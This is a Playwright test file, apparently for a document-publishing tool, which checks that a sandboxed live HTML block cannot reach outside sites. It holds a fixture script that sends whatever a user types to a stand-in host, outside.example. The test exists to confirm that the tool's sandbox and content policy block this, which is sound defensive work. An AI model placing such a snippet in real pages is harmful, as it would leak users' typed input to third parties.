import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { expect, test, type Page } from '@playwright/test';

const env = process.env;
test.use({ extraHTTPHeaders: { 'Cf-Access-Jwt-Assertion': env.LOTUSPOD_TEST_ASSERTION ?? '' } });
// A block that carries what the reader types off to another site in an address.
const leak = `<input aria-label="Word"><button>Send</button>
<script>document.querySelector('button').onclick = () => { location.href = 'http://outside.example/leak?typed=' + encodeURIComponent(document.querySelector('input').value); };</script>`;

function publish(name: string) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'widget-navigation-'));
  try {
    const file = path.join(dir, `${name}.md`);
    fs.writeFileSync(file, '# Leaky block\n\nA block that tries to leave.\n\n```html live title="Leak" id=leak height=160\n' + leak + '\n```\n');
    execFileSync(env.LOTUSPOD_TEST_PYTHON!, ['-m', 'lotuspod', 'publish', file, '--local', '--out-dir', env.LOTUSPOD_TEST_OUT!, '--owner', 'hermes', '--credential', env.LOTUSPOD_TEST_CREDENTIAL_HERMES!, '--comments'], {env: {...env, PYTHONPATH: path.resolve(__dirname, '../../../../src')}});
  } finally { fs.rmSync(dir, {recursive: true, force: true}); }
}

test('a live block reaches no other site from its page or opened alone', async ({page, context}) => {
  publish('widget-navigation');
  const outside: string[] = [];
  await context.route(url => url.hostname === 'outside.example', async route => {
    outside.push(route.request().url());
    await route.fulfill({status: 200, contentType: 'text/html', body: '<p>Outside</p>'});
  });
  const blocked: string[] = [];
  const watch = (tab: Page) => tab.on('console', message => {
    if (message.text().includes("frame-src 'self'")) blocked.push(message.text());
  });
  watch(page);
  context.on('page', watch);

  await page.goto('/widget-navigation.html?standalone');
  const pageURL = page.url();
  const figure = page.locator('figure[data-widget="leak"]');
  await expect(figure.locator('.artifact-live-badge')).toHaveText('Live');
  const inner = page.frameLocator('figure[data-widget="leak"] iframe');
  await inner.getByLabel('Word').fill('secret');
  await inner.getByRole('button', {name: 'Send'}).click();
  await expect.poll(() => outside.length + blocked.length).toBeGreaterThan(0);
  expect(outside).toEqual([]);
  expect(page.url()).toBe(pageURL);
  expect(await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content'))
    .toContain("frame-src 'self'");

  blocked.length = 0;
  const widgetURL = new URL((await figure.locator('iframe').getAttribute('src'))!, page.url()).href;
  const popupPromise = context.waitForEvent('page');
  await figure.getByRole('link', {name: 'Open alone'}).click();
  const popup = await popupPromise;
  await popup.waitForLoadState();
  // The block's own document, wherever the tab puts it: the button must sit
  // in a frame, and the check below says so.
  const framed = await popup.locator('iframe').count() === 1;
  const alone = framed ? popup.frameLocator('iframe') : popup.locator(':root');
  await alone.getByLabel('Word').fill('secret');
  expect(await alone.locator('body').evaluate(() => self.origin)).toBe('null');
  await alone.getByRole('button', {name: 'Send'}).click();
  await expect.poll(() => outside.length + blocked.length).toBeGreaterThan(0);
  expect(outside).toEqual([]);
  expect(popup.url()).toBe(widgetURL);
  expect(framed).toBe(true);
  await popup.close();
});
